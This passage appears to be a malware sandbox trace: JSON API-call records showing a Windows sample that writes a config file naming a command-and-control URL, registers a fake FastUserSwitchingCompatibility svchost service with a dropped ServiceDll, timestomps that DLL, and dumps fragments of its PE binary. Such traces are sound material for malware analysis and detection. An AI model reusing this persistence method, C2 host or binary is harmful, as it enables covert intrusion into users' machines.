Àt\u0014U\b+Ð\b\f\u0002@ÉuöE\b]Ã3À]ÃUìQV3öÇEüjwy79u\f~7Æ÷}\fÆà\u0003ÊÁù\u00102L\u0005üÂÁø\b2ÈE\b2Ñ\f\u0006\u0001Àt\b:Ât\u00042Â\u0001F;u\f|É^ÉÃÃ3ÀÂ\u0004\u0000Uìì\u0018¡ ÆC\u00003ÅEüVu\bWj\u00023ÿWWÿ\u0015\u0010Ð@\u0000Eè;ÇtiSh\u0010\u0000\u0001\u0000VPÿ\u0015\u0014Ð@\u00005\u0018Ð@\u0000Ø;ßtIj\u0010EìWPè\u0017\u000f\u0000\u0000EìhÌÑ@\u0000Pè\u000e\u0000\u0000EìhÀÑ@\u0000Pè\r\u0000\u0000Ä\u001ch°Ñ@\u0000ÿ\u0015hÐ@\u0000MìQPÿ\u0015pÐ@\u0000WWSÿÐSÿÖÿuèÿÖ[Mü_3Í^èB\u000f\u0000\u0000ÉÃUì3Ò9U\f~\u0016E\b\f\u0002\u0001Àt\u00044>\u0001B;U\f|ê]ÃUìì0\u0005\u0000\u0000¡ ÆC\u00003ÅEüSW3ÿ»\u0004\u0001\u0000\u0000SìúÿÿP½äúÿÿ½àúÿÿ½Üúÿÿ½Ðúÿÿ½Ôúÿÿ½Øúÿÿÿ\u0015TÐ@\u0000ìúÿÿPxþÿÿhD",
+  "length": 512,
+  "offset": 0
+}
+{
+  "create_disposition": 3,
+  "file_handle": "0x0000004c",
+  "filepath": "C:\\Windows\\system\\config_t.dat",
+  "desired_access": "0xc0100000",
+  "file_attributes": 128,
+  "filepath_r": "\\??\\C:\\Windows\\system\\config_t.dat",
+  "create_options": 96,
+  "status_info": 1,
+  "share_access": 7
+}
+{
+  "file_handle": "0x0000004c",
+  "information_class": 5
+}
+{
+  "process_identifier": 2404,
+  "region_size": 1052672,
+  "stack_dep_bypass": 0,
+  "stack_pivoted": 0,
+  "heap_dep_bypass": 0,
+  "protection": 4,
+  "process_handle": "0xffffffff",
+  "allocation_type": 8192,
+  "base_address": "0x013a0000"
+}
+{
+  "process_identifier": 2404,
+  "region_size": 4096,
+  "stack_dep_bypass": 0,
+  "stack_pivoted": 0,
+  "heap_dep_bypass": 0,
+  "protection": 4,
+  "process_handle": "0xffffffff",
+  "allocation_type": 4096,
+  "base_address": "0x013a0000"
+}
+{
+  "file_handle": "0x0000004c",
+  "buffer": "",
+  "length": 0,
+  "offset": 0
+}
+{
+  "file_handle": "0x0000004c",
+  "filepath": "C:\\Windows\\system\\config_t.dat",
+  "buffer": "[Option]\r\nWebPage=http://sunshine.59.ydli.net/sespor/gnsatzm/jknml/aneywsf.asp\r\n",
+  "offset": 0
+}
+{
+  "file_handle": "0x0000004c",
+  "information_class": 20
+}
+{
+  "free_type": 32768,
+  "process_identifier": 2404,
+  "process_handle": "0xffffffff",
+  "base_address": "0x013a0000",
+  "size": 1052672
+}
+{
+  "handle": "0x0000004c"
+}
+{
+  "create_disposition": 3,
+  "file_handle": "0x0000004c",
+  "filepath": "C:\\Windows\\system\\config_t.dat",
+  "desired_access": "0xc0100000",
+  "file_attributes": 128,
+  "filepath_r": "\\??\\C:\\Windows\\system\\config_t.dat",
+  "create_options": 96,
+  "status_info": 1,
+  "share_access": 7
+}
+{
+  "file_handle": "0x0000004c",
+  "information_class": 5
+}
+{
+  "process_identifier": 2404,
+  "region_size": 1052672,
+  "stack_dep_bypass": 0,
+  "stack_pivoted": 0,
+  "heap_dep_bypass": 0,
+  "protection": 4,
+  "process_handle": "0xffffffff",
+  "allocation_type": 8192,
+  "base_address": "0x013a0000"
+}
+{
+  "process_identifier": 2404,
+  "region_size": 4096,
+  "stack_dep_bypass": 0,
+  "stack_pivoted": 0,
+  "heap_dep_bypass": 0,
+  "protection": 4,
+  "process_handle": "0xffffffff",
+  "allocation_type": 4096,
+  "base_address": "0x013a0000"
+}
+{
+  "file_handle": "0x0000004c",
+  "buffer": "[Option]\r\nWebPage=http://sunshine.59.ydli.net/sespor/gnsatzm/jknml/aneywsf.asp\r\n",
+  "length": 80,
+  "offset": 0
+}
+{
+  "file_handle": "0x0000004c",
+  "filepath": "C:\\Windows\\system\\config_t.dat",
+  "buffer": "DownCmdTime=10\r\n",
+  "offset": 80
+}
+{
+  "file_handle": "0x0000004c",
+  "information_class": 20
+}
+{
+  "free_type": 32768,
+  "process_identifier": 2404,
+  "process_handle": "0xffffffff",
+  "base_address": "0x013a0000",
+  "size": 1052672
+}
+{
+  "handle": "0x0000004c"
+}
+{
+  "create_disposition": 3,
+  "file_handle": "0x0000004c",
+  "filepath": "C:\\Windows\\system\\config_t.dat",
+  "desired_access": "0xc0100000",
+  "file_attributes": 128,
+  "filepath_r": "\\??\\C:\\Windows\\system\\config_t.dat",
+  "create_options": 96,
+  "status_info": 1,
+  "share_access": 7
+}
+{
+  "file_handle": "0x0000004c",
+  "information_class": 5
+}
+{
+  "process_identifier": 2404,
+  "region_size": 1052672,
+  "stack_dep_bypass": 0,
+  "stack_pivoted": 0,
+  "heap_dep_bypass": 0,
+  "protection": 4,
+  "process_handle": "0xffffffff",
+  "allocation_type": 8192,
+  "base_address": "0x013a0000"
+}
+{
+  "process_identifier": 2404,
+  "region_size": 4096,
+  "stack_dep_bypass": 0,
+  "stack_pivoted": 0,
+  "heap_dep_bypass": 0,
+  "protection": 4,
+  "process_handle": "0xffffffff",
+  "allocation_type": 4096,
+  "base_address": "0x013a0000"
+}
+{
+  "file_handle": "0x0000004c",
+  "buffer": "[Option]\r\nWebPage=http://sunshine.59.ydli.net/sespor/gnsatzm/jknml/aneywsf.asp\r\nDownCmdTime=10\r\n",
+  "length": 96,
+  "offset": 0
+}
+{
+  "file_handle": "0x0000004c",
+  "filepath": "C:\\Windows\\system\\config_t.dat",
+  "buffer": "UploadRate=128\r\n",
+  "offset": 96
+}
+{
+  "file_handle": "0x0000004c",
+  "information_class": 20
+}
+{
+  "free_type": 32768,
+  "process_identifier": 2404,
+  "process_handle": "0xffffffff",
+  "base_address": "0x013a0000",
+  "size": 1052672
+}
+{
+  "handle": "0x0000004c"
+}
+{
+  "create_disposition": 3,
+  "file_handle": "0x0000004c",
+  "filepath": "C:\\Windows\\system\\config_t.dat",
+  "desired_access": "0xc0100000",
+  "file_attributes": 128,
+  "filepath_r": "\\??\\C:\\Windows\\system\\config_t.dat",
+  "create_options": 96,
+  "status_info": 1,
+  "share_access": 7
+}
+{
+  "file_handle": "0x0000004c",
+  "information_class": 5
+}
+{
+  "process_identifier": 2404,
+  "region_size": 1052672,
+  "stack_dep_bypass": 0,
+  "stack_pivoted": 0,
+  "heap_dep_bypass": 0,
+  "protection": 4,
+  "process_handle": "0xffffffff",
+  "allocation_type": 8192,
+  "base_address": "0x013a0000"
+}
+{
+  "process_identifier": 2404,
+  "region_size": 4096,
+  "stack_dep_bypass": 0,
+  "stack_pivoted": 0,
+  "heap_dep_bypass": 0,
+  "protection": 4,
+  "process_handle": "0xffffffff",
+  "allocation_type": 4096,
+  "base_address": "0x013a0000"
+}
+{
+  "file_handle": "0x0000004c",
+  "buffer": "[Option]\r\nWebPage=http://sunshine.59.ydli.net/sespor/gnsatzm/jknml/aneywsf.asp\r\nDownCmdTime=10\r\nUploadRate=128\r\n",
+  "length": 112,
+  "offset": 0
+}
+{
+  "file_handle": "0x0000004c",
+  "filepath": "C:\\Windows\\system\\config_t.dat",
+  "buffer": "[Other]\r\nUP=0\r\n",
+  "offset": 112
+}
+{
+  "file_handle": "0x0000004c",
+  "information_class": 20
+}
+{
+  "free_type": 32768,
+  "process_identifier": 2404,
+  "process_handle": "0xffffffff",
+  "base_address": "0x013a0000",
+  "size": 1052672
+}
+{
+  "handle": "0x0000004c"
+}
+{
+  "create_disposition": 3,
+  "file_handle": "0x0000004c",
+  "filepath": "C:\\Windows\\system\\config_t.dat",
+  "desired_access": "0xc0100000",
+  "file_attributes": 128,
+  "filepath_r": "\\??\\C:\\Windows\\system\\config_t.dat",
+  "create_options": 96,
+  "status_info": 1,
+  "share_access": 7
+}
+{
+  "file_handle": "0x0000004c",
+  "information_class": 5
+}
+{
+  "process_identifier": 2404,
+  "region_size": 1052672,
+  "stack_dep_bypass": 0,
+  "stack_pivoted": 0,
+  "heap_dep_bypass": 0,
+  "protection": 4,
+  "process_handle": "0xffffffff",
+  "allocation_type": 8192,
+  "base_address": "0x013a0000"
+}
+{
+  "process_identifier": 2404,
+  "region_size": 4096,
+  "stack_dep_bypass": 0,
+  "stack_pivoted": 0,
+  "heap_dep_bypass": 0,
+  "protection": 4,
+  "process_handle": "0xffffffff",
+  "allocation_type": 4096,
+  "base_address": "0x013a0000"
+}
+{
+  "file_handle": "0x0000004c",
+  "buffer": "[Option]\r\nWebPage=http://sunshine.59.ydli.net/sespor/gnsatzm/jknml/aneywsf.asp\r\nDownCmdTime=10\r\nUploadRate=128\r\n[Other]\r\nUP=0\r\n",
+  "length": 127,
+  "offset": 0
+}
+{
+  "file_handle": "0x0000004c",
+  "filepath": "C:\\Windows\\system\\config_t.dat",
+  "buffer": "[OtherTwo]\r\nAutoCheck=1\r\n",
+  "offset": 127
+}
+{
+  "file_handle": "0x0000004c",
+  "information_class": 20
+}
+{
+  "free_type": 32768,
+  "process_identifier": 2404,
+  "process_handle": "0xffffffff",
+  "base_address": "0x013a0000",
+  "size": 1052672
+}
+{
+  "handle": "0x0000004c"
+}
+{}
+{
+  "access": "0x00000001",
+  "base_handle": "0x80000002",
+  "key_handle": "0x0000004c",
+  "regkey": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost",
+  "regkey_r": "SOFTWARE\\Microsoft\\Windows NT\\\\CurrentVersion\\Svchost",
+  "options": 0
+}
+{
+  "key_handle": "0x0000004c",
+  "value": "AeLookupSvc\u0000CertPropSvc\u0000SCPolicySvc\u0000lanmanserver\u0000gpsvc\u0000IKEEXT\u0000AudioSrv\u0000FastUserSwitchingCompatibility\u0000Ias\u0000Irmon\u0000Nla\u0000Ntmssvc\u0000NWCWorkstation\u0000Nwsapagent\u0000Rasauto\u0000Rasman\u0000Remoteaccess\u0000SENS\u0000Sharedaccess\u0000SRService\u0000Tapisrv\u0000Wmi\u0000WmdmPmSp\u0000TermService\u0000wuauserv\u0000BITS\u0000ShellHWDetection\u0000LogonHours\u0000PCAudit\u0000helpsvc\u0000uploadmgr\u0000iphlpsvc\u0000seclogon\u0000AppInfo\u0000msiscsi\u0000MMCSS\u0000wercplsupport\u0000EapHost\u0000ProfSvc\u0000schedule\u0000hkmsvc\u0000SessionEnv\u0000winmgmt\u0000browser\u0000Themes\u0000BDESVC\u0000AppMgmt\u0000\u0000",
+  "regkey_r": "netsvcs",
+  "reg_type": 7,
+  "regkey": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\\netsvcs"
+}
+{
+  "key_handle": "0x0000004c"
+}
+{
+  "desired_access": 983103,
+  "machine_name": "",
+  "database_name": ""
+}
+{
+  "dirpath": "C:\\Windows\\system32"
+}
+{
+  "access": "0x00000001",
+  "base_handle": "0x80000002",
+  "key_handle": "0x0000006c",
+  "regkey": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\AeLookupSvc",
+  "regkey_r": "SYSTEM\\CurrentControlSet\\Services\\AeLookupSvc",
+  "options": 0
+}
+{
+  "key_handle": "0x0000006c"
+}
+{
+  "access": "0x00000001",
+  "base_handle": "0x80000002",
+  "key_handle": "0x0000006c",
+  "regkey": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\CertPropSvc",
+  "regkey_r": "SYSTEM\\CurrentControlSet\\Services\\CertPropSvc",
+  "options": 0
+}
+{
+  "key_handle": "0x0000006c"
+}
+{
+  "access": "0x00000001",
+  "base_handle": "0x80000002",
+  "key_handle": "0x0000006c",
+  "regkey": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SCPolicySvc",
+  "regkey_r": "SYSTEM\\CurrentControlSet\\Services\\SCPolicySvc",
+  "options": 0
+}
+{
+  "key_handle": "0x0000006c"
+}
+{
+  "access": "0x00000001",
+  "base_handle": "0x80000002",
+  "key_handle": "0x0000006c",
+  "regkey": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\lanmanserver",
+  "regkey_r": "SYSTEM\\CurrentControlSet\\Services\\lanmanserver",
+  "options": 0
+}
+{
+  "key_handle": "0x0000006c"
+}
+{
+  "access": "0x00000001",
+  "base_handle": "0x80000002",
+  "key_handle": "0x0000006c",
+  "regkey": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\gpsvc",
+  "regkey_r": "SYSTEM\\CurrentControlSet\\Services\\gpsvc",
+  "options": 0
+}
+{
+  "key_handle": "0x0000006c"
+}
+{
+  "access": "0x00000001",
+  "base_handle": "0x80000002",
+  "key_handle": "0x0000006c",
+  "regkey": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\IKEEXT",
+  "regkey_r": "SYSTEM\\CurrentControlSet\\Services\\IKEEXT",
+  "options": 0
+}
+{
+  "key_handle": "0x0000006c"
+}
+{
+  "access": "0x00000001",
+  "base_handle": "0x80000002",
+  "key_handle": "0x0000006c",
+  "regkey": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\AudioSrv",
+  "regkey_r": "SYSTEM\\CurrentControlSet\\Services\\AudioSrv",
+  "options": 0
+}
+{
+  "key_handle": "0x0000006c"
+}
+{
+  "access": "0x00000001",
+  "base_handle": "0x80000002",
+  "key_handle": "0x00000000",
+  "regkey": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\FastUserSwitchingCompatibility",
+  "regkey_r": "SYSTEM\\CurrentControlSet\\Services\\FastUserSwitchingCompatibility",
+  "options": 0
+}
+{
+  "filepath_r": "C:\\Windows\\system32\\FastUserSwitchingCompatibilityex.dll",
+  "filepath": "C:\\Windows\\System32\\FastUserSwitchingCompatibilityex.dll"
+}
+{
+  "file_attributes": 4294967295,
+  "filepath_r": "C:\\Windows\\system32\\FastUserSwitchingCompatibilityex.dll",
+  "filepath": "C:\\Windows\\System32\\FastUserSwitchingCompatibilityex.dll"
+}
+{
+  "basename": "advapi32",
+  "module_address": "0x773f0000",
+  "flags": 0,
+  "module_name": "advapi32.dll",
+  "stack_pivoted": 0
+}
+{
+  "ordinal": 0,
+  "module": "ADVAPI32",
+  "module_address": "0x773f0000",
+  "function_address": "0x77433158",
+  "function_name": "CreateServiceA"
+}
+{
+  "service_start_name": "",
+  "start_type": 2,
+  "service_handle": "0x005a1150",
+  "display_name": "FastUserSwitchingCompatibility",
+  "error_control": 1,
+  "service_name": "FastUserSwitchingCompatibility",
+  "filepath": "C:\\Users\\faker\\AppData\\Local\\Temp\\%SystemRoot%\\System32\\svchost.exe -k netsvcs",
+  "filepath_r": "%SystemRoot%\\System32\\svchost.exe -k netsvcs",
+  "service_manager_handle": "0x005a11f0",
+  "desired_access": 983551,
+  "service_type": 32,
+  "password": ""
+}
+{
+  "thread_name": "0x003bc498",
+  "stack_zero_bits": 0,
+  "thread_handle": "0x00000080",
+  "process_identifier": 2404,
+  "parameter": "0x005a4550",
+  "access": "0x001fffff",
+  "function_address": "0x775afd0f",
+  "suspended": 3,
+  "process_handle": "0xffffffff"
+}
+{
+  "handle_attributes": 0,
+  "source_process_identifier": 2404,
+  "source_handle": "0x00000080",
+  "target_process_identifier": 2404,
+  "desired_access": "0x00000000",
+  "target_process_handle": "0xffffffff",
+  "target_handle": "0x00000084",
+  "source_process_handle": "0xffffffff",
+  "options": 6
+}
+{
+  "thread_handle": "0x00000080",
+  "suspend_count": 1,
+  "process_identifier": 2404
+}
+{
+  "access": "0x000f003f",
+  "base_handle": "0x80000002",
+  "key_handle": "0x00000094",
+  "regkey": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\FastUserSwitchingCompatibility",
+  "regkey_r": "SYSTEM\\CurrentControlSet\\Services\\FastUserSwitchingCompatibility",
+  "options": 0
+}
+{
+  "skipped": 0,
+  "milliseconds": 10
+}
+{
+  "key_handle": "0x00000094",
+  "value": 288,
+  "regkey_r": "Type",
+  "reg_type": 4,
+  "regkey": "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\services\\FastUserSwitchingCompatibility\\Type"
+}
+{
+  "skipped": 0,
+  "milliseconds": 10
+}
+{
+  "access": "0x02000000",
+  "base_handle": "0x00000094",
+  "regkey": "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\services\\FastUserSwitchingCompatibility\\Parameters",
+  "key_handle": "0x00000098",
+  "options": 0,
+  "regkey_r": "Parameters",
+  "disposition": 0,
+  "class": ""
+}
+{
+  "key_handle": "0x00000098",
+  "value": "C:\\Windows\\system32\\FastUserSwitchingCompatibilityex.dll",
+  "regkey_r": "ServiceDll",
+  "reg_type": 2,
+  "regkey": "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\services\\FastUserSwitchingCompatibility\\Parameters\\ServiceDll"
+}
+{
+  "key_handle": "0x00000094"
+}
+{
+  "key_handle": "0x00000098"
+}
+{
+  "create_disposition": 5,
+  "file_handle": "0x00000098",
+  "filepath": "C:\\Windows\\System32\\FastUserSwitchingCompatibilityex.dll",
+  "desired_access": "0x40100080",
+  "file_attributes": 128,
+  "filepath_r": "\\??\\C:\\Windows\\system32\\FastUserSwitchingCompatibilityex.dll",
+  "create_options": 96,
+  "status_info": 2,
+  "share_access": 0
+}
+{
+  "skipped": 0,
+  "milliseconds": 10
+}
+{
+  "basename": "kernel32",
+  "module_address": "0x77490000",
+  "flags": 0,
+  "module_name": "kernel32.dll",
+  "stack_pivoted": 0
+}
+{
+  "ordinal": 0,
+  "module": "kernel32",
+  "module_address": "0x77490000",
+  "function_address": "0x774cbe16",
+  "function_name": "SetFileTime"
+}
+{
+  "file_handle": "0x00000098"
+}
+{
+  "basename": "kernel32",
+  "module_address": "0x77490000",
+  "flags": 0,
+  "module_name": "kernel32.dll",
+  "stack_pivoted": 0
+}
+{
+  "skipped": 0,
+  "milliseconds": 10
+}
+{
+  "ordinal": 0,
+  "module": "kernel32",
+  "module_address": "0x77490000",
+  "function_address": "0x774e1400",
+  "function_name": "WriteFile"
+}
+{
+  "file_handle": "0x00000098",
+  "filepath": "C:\\Windows\\System32\\FastUserSwitchingCompatibilityex.dll",
+  "buffer": "MZ\u0000\u0003\u0000\u0000\u0000\u0004\u0000\u0000\u0000ÿÿ\u0000\u0000¸\u0000\u0000\u0000\u0000\u0000\u0000\u0000@\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000à\u0000\u0000\u0000\u000e\u001fº\u000e\u0000´\tÍ!¸\u0001LÍ!This program cannot be run in DOS mode.\r\r\n$\u0000\u0000\u0000\u0000\u0000\u0000\u0000{^\u0011Ã??\u007f??\u007f??\u007f¬qç;?\u007fPIá%?\u007fPIÕ²?\u007f??~?\u007f6Gì.?\u007fPIÔ~?\u007fPIä>?\u007fPIâ>?\u007fRich??\u007f\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000PE\u0000\u0000L\u0001\u0005\u0000\u0011qIQ\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000à\u0000\u0002!\u000b\u0001\n\u0000\u0000\u0002\u0002\u0000\u0000°\u0000\u0000\u0000\u0000\u0000\u0000\u0013Ò\u0000\u0000\u0000\u0010\u0000\u0000\u0000 \u0002\u0000\u0000\u0000\u0000\u0010\u0000\u0010\u0000\u0000\u0000\u0002\u0000\u0000\u0005\u0000\u0001\u0000\u0000\u0000\u0000\u0000\u0005\u0000\u0001\u0000\u0000\u0000\u0000\u0000\u0000À\u0003\u0000\u0000\u0004\u0000\u0000\u0005ô\u0002\u0000\u0003\u0000@\u0001\u0000\u0000\u0010\u0000\u0000\u0010\u0000\u0000\u0000\u0000\u0010\u0000\u0000\u0010\u0000\u0000\u0000\u0000\u0000\u0000\u0010\u0000\u0000\u0000à\u0002\u0000F\u0000\u0000\u0000\u0014x\u0002\u0000 \u0000\u0000\u0000\u0000\u0003\u0000´\u0001\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0003\u0000H\u001d\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000`\u0002\u0000@\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000 \u0002\u0000\u0002\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000.text\u0000\u0000\u0000r\u0000\u0002\u0000\u0000\u0010\u0000\u0000\u0000\u0002\u0002\u0000\u0000\u0004\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000 \u0000\u0000`.rdata\u0000\u0000&g\u0000\u0000\u0000 \u0002\u0000\u0000h\u0000\u0000\u0000\u0006\u0002\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000@\u0000\u0000@.data\u0000\u0000\u0000\fî\u0000\u0000\u0000\u0002\u0000\u0000\u001a\u0000\u0000\u0000n\u0002\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000@\u0000\u0000À.rsrc\u0000\u0000\u0000´\u0001\u0000\u0000\u0000\u0003\u0000\u0000\u0002\u0000\u0000\u0000\u0002\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000@\u0000\u0000@.reloc\u0000\u0000È+\u0000\u0000\u0000\u0003\u0000\u0000,\u0000\u0000\u0000\u0002\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000@\u0000\u0000B\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000UìE\u001cU Vu\u0010W8;þ}AM\u0018S9;}\f}\u001d]\b\u000f¾\u001c\u001fG9:\u000f¶ÛÁç\b\u000bû:\u0000\b90|Ü8[;þ}\u0012\u0012Î+ÏÓâM\u00149 \u0000ë\u000f\u0012Ï+ÎÓêM\u00141)0\u0004µ\u0004\u0002\u0010_#Â^]ÃUìì\u0010S3ÛV3ö]ð]ô]øÇEü\u0006\u0000\u0000\u00009]\fu\u00073Àé\u0000\u0000\u00009]\u0014tôWÿu\u0014}\u0010SWèÔ\u0000\u0000EøPEôPEðPEüPj\u0006ÿu\fÿu\bè7ÿÿÿÄ(ë.\r\u0000\u0002\u0010\u0004\u0001\u0004>EøPEôPEðPEüPÿuüFÿu\fÿu\bè\u0007ÿÿÿÄ\u001c9]ü\u007fÍë\u0005Æ\u0004>*FÆ%\u0003\u0000\u0000y\u0005HÈü@uëÆ_^[ÉÃÇ\u0001H#\u0002\u0010I\u0004Ét\u0007Qÿ\u00158 \u0002\u0010ÃUìVW3ÿWh\u0000\u0000\u0000j\u0003Wj\u0003h\u0000\u0000\u0000ÿu\bñÿ\u0015H \u0002\u0010E\bøÿu\u00043ÀëGShL#\u0002\u0010WWj\u0002WPÿ\u0015D \u0002\u0010Ø;ßt\u0013WWWj\u0004Sÿ\u0015@ \u0002\u0010F\u0004;Çu\u00043Àë\u0017ÿu\b=< \u0002\u0010ÿ×Sÿ×F\u0004H\u001cN\b[_^]Â\u0004\u0000Uìì\u0010\u0001\u0000\u0000¡ \u0002\u00103ÅEüSV3Ûh\u0003\u0001\u0000\u0000ñùþÿÿSPÇ\u0006H#\u0002\u0010^\u0004^\bøþÿÿè\u0000\u0000Ä\fôþÿÿPh\u0019\u0000\u0002\u0000Sh#\u0002\u0010h\u0001\u0000\u0000ÿ\u0015\u001c \u0002\u0010Àu7ðþÿÿPøþÿÿPSSh|#\u0002\u0010ÿµôþÿÿÇðþÿÿ\u0004\u0001\u0000\u0000ÿ\u0015  \u0002\u0010ÿµôþÿÿÿ\u0015$ \u0002\u0010øþÿÿhd#\u0002\u0010Pèø\u0000\u0000YYøþÿÿPÎèÌþÿÿMüF\u0004Æ^3Í[è\u0000\u0000ÉÃUìVñèþÿÿöE\b\u0001t\u0007Vè¦ \u0000\u0000YÆ^]Â\u0004\u0000UìVu\bj\u0004hÐ#\u0002\u0010Vè¬\u0000\u0000Ä\fÀt\u00043ÀëK~\u0004\u0000vöhÌ#\u0002\u0010ÆhVèã\u0000\u0000ðYYötàW}\u0010FVOèß£\u0000\u0000@Y;Çs\nVèÓ£\u0000\u0000Y@ë\u0002ÇPVÿu\fèS \u0000\u0000Ä\f3À@_^]Â\f\u0000Uìì\u0018\u0004\u0000\u0000¡ \u0002\u00103ÅEüE\bWùðûÿÿG\u0004À\u000fò\u0001\u0000\u0000W\bÒ\u000fç\u0001\u0000\u0000H É\u000fÜ\u0001\u0000\u0000;Ê\u000fÔ\u0001\u0000\u0000¥øûÿÿ\u0000Vj\u00044\bh\\#\u0002\u0010Vèñ\u0000\u0000Ä\fÀ\u000f¨\u0001\u0000\u0000SF\u0004N\b¥ôûÿÿ\u0000Áà\u0004èûÿÿìûÿÿÀ\u000fP\u0001\u0000\u0000^\u0014CüÀ\u000fB\u0001\u0000\u0000ø\u0003\u000f\u001e\u0001\u0000\u00003ö\u000f\u0002\u0001\u0000\u0000þ\u0003\u000fù\u0000\u0000\u0000;w\b\u000fð\u0000\u0000\u0000hÿ\u0003\u0000\u0000ýûÿÿj\u0000PÆüûÿÿ\u0000è\u0000\u0000Ä\fh\u0000\u0004\u0000\u0000üûÿÿPG\u0004\u0003ÆPÏèþÿÿÀ\u000f²\u0000\u0000\u0000üûÿÿj?Pè¨\u0000\u0000YYÀt\u0003Æ\u0000\u0000üûÿÿj/Pè\u0000\u0000ðYYöt.üûÿÿj/Pè;\u0000\u0000YYÀt\u001a+Æø\u0001u\u0013üûÿÿhØ#\u0002\u0010Pèí\u0000\u0000YYðûÿÿøûÿÿ4üûÿÿPè@¢\u0000\u00003Éj\u0002@Z÷â\u000fÁ÷Ù\u000bÈQè\u0018¥\u0000\u0000\u0006üûÿÿPè\u001d¢\u0000\u0000@PüûÿÿPÿ6è¤\u0000\u0000Ä\u0018ÿøûÿÿ½øûÿÿ\u0013\u0000\u0000}SèûÿÿÿôûÿÿôûÿÿÃ\b;ìûÿÿ\u000f³þÿÿ½øûÿÿ\u0013\u0000\u0000}&